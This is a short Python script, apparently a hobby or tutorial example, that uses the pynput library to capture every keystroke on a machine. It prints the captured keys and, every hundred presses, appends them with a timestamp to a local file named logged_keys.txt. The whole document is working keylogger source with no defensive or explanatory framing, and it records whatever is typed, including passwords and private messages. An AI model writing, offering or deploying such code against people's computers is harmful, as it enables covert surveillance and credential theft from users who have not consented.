# Import necessary modules from the pynput library

from pynput.keyboard import Key, Listener
import datetime as dt

# Initialize a counter for tracking character count and a list to store keys
character_count = 0
keys_list = []

# Define the function that's called when a key is pressed
def key_pressed(key):
    global keys_list, character_count  # Access global variables for modification
    character_count += 1  # Increment the character count
    keys_list.append(str(key).replace("'", ""))  # Append the key to the list

    print(keys_list)  # Print the current list of keys

    # Check if the character count has reached the threshold
    if character_count >= 100:
        updated_file(keys_list)  # Call the function to update the file
        character_count = 0  # Reset the count
        keys_list.clear()  # Clear the keys list

# Define the function to update the file with the logged keys
def updated_file(keys_list):
    current_datetime = dt.datetime.now()
    formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")

    with open("./logged_keys.txt", "a") as file:  # Open the file for appending
        file.write(f"*** {formatted_datetime }***\n\n")
        for index, key in enumerate(keys_list):  # Iterate over the keys
            if index > 0 and key == "Key.space" and keys_list[index - 1] != "Key.space":
                file.write("\n")  # Add a newline if it's a space not preceded by a space
            elif key != "Key.space" and "Key" not in key:
                file.write(key)  # Write the key to the file
        file.write("\n\n\n ----- End of Upload -----  \n\n\n")  # Add a newline at the end of the keys

# Set up a listener for key presses with the key_pressed function
with Listener(on_press=key_pressed) as listener:
    listener.join()  # Start listening for key presses